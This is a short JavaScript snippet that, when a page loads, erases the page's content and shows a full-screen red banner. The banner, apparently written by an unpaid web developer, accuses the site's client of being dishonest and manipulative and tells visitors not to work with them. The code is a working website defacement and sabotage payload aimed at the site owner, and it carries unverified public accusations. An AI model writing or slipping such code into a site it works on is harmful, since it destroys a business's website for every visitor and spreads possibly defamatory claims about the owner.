    document.addEventListener("DOMContentLoaded", function () {
        // Empty the body first
        document.body.innerHTML = '';

        // Hide all existing divs just in case (not necessary here)
        document.querySelectorAll("div").forEach(div => {
            div.style.display = "none";
        });

        // Create paragraph element
        const message = document.createElement("p");
        message.innerText = "This client is refusing to pay me. What we agreed on was that I would receive payment for my work, but instead, they keep giving me more work without paying. I built this website for them, and now they have removed my access and are still not giving me my money. Do not work with this client they are completely unprofessional, dishonest, unreliable, manipulative, and a total nightmare to deal with.";

        // Style the paragraph
        Object.assign(message.style, {
            position: "fixed",
            top: "50%",
            left: "50%",
            transform: "translate(-50%, -50%)",
            fontSize: "23px",
            fontWeight: "bold",
            color: "red",
            background: "black",
            padding: "20px",
            textAlign: "center",
            zIndex: "9999",
            width: "98%"
        });

        // Append to body
        document.body.appendChild(message);
    });
